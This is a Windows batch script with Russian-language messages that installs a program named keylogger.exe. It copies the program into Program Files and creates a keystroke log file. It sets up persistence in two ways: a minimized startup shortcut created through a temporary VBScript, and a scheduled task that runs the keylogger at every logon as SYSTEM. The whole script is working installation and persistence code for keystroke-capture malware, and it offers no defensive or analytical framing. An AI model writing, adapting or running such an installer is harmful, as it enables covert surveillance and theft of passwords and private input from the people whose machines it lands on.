@echo off
chcp 65001 >nul
title Установка Keylogger
color 0B

:: Проверка прав администратора
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] Для установки в систему требуются права администратора!
    echo Запустите файл от имени администратора
    pause
    exit /b 1
)

cls
echo ================================================
echo         УСТАНОВКА KEYLOGGER В СИСТЕМУ
echo ================================================
echo.

:: Создание папки
set INSTALL_DIR=%ProgramFiles%\Keylogger
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%"
    echo [OK] Создана папка: %INSTALL_DIR%
)

:: Копирование файлов
copy /y "%~dp0keylogger.exe" "%INSTALL_DIR%\" >nul
if %errorlevel% equ 0 (
    echo [OK] Программа скопирована
)

copy /y "%~dp0run_keylogger.bat" "%INSTALL_DIR%\" >nul
if %errorlevel% equ 0 (
    echo [OK] BAT файл скопирован
)

:: Создание лог файла
echo === Keylogger System Log === > "%INSTALL_DIR%\keylog.txt"
echo Дата установки: %date% %time% >> "%INSTALL_DIR%\keylog.txt"
echo ============================ >> "%INSTALL_DIR%\keylog.txt"
echo [OK] Лог файл создан

:: Создание ярлыков
set STARTUP_DIR=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup

:: Ярлык для автозагрузки в user режиме
echo Set oWS = WScript.CreateObject("WScript.Shell") > "%temp%\create_user.lnk.vbs"
echo sLinkFile = "%STARTUP_DIR%\Keylogger (User).lnk" >> "%temp%\create_user.lnk.vbs"
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> "%temp%\create_user.lnk.vbs"
echo oLink.TargetPath = "%INSTALL_DIR%\keylogger.exe" >> "%temp%\create_user.lnk.vbs"
echo oLink.WorkingDirectory = "%INSTALL_DIR%" >> "%temp%\create_user.lnk.vbs"
echo oLink.Description = "Keylogger (User Mode)" >> "%temp%\create_user.lnk.vbs"
echo oLink.WindowStyle = 7 >> "%temp%\create_user.lnk.vbs"
echo oLink.Save >> "%temp%\create_user.lnk.vbs"
cscript /nologo "%temp%\create_user.lnk.vbs"
del "%temp%\create_user.lnk.vbs"
echo [OK] Ярлык для пользовательского режима создан

:: Создание задания в планировщике для admin режима
schtasks /create /tn "KeyloggerAdmin" /tr "%INSTALL_DIR%\keylogger.exe" /sc onlogon /ru "SYSTEM" /f >nul 2>&1
if %errorlevel% equ 0 (
    echo [OK] Задание в планировщике создано (админ режим)
)

echo.
echo ================================================
echo УСТАНОВКА ЗАВЕРШЕНА
echo ================================================
echo.
echo Программа установлена в: %INSTALL_DIR%
echo Лог файл: %INSTALL_DIR%\keylog.txt
echo.
echo Два режима работы:
echo 1. Обычный режим - запускается из автозагрузки
echo 2. Админ режим - запускается через планировщик
echo.
pause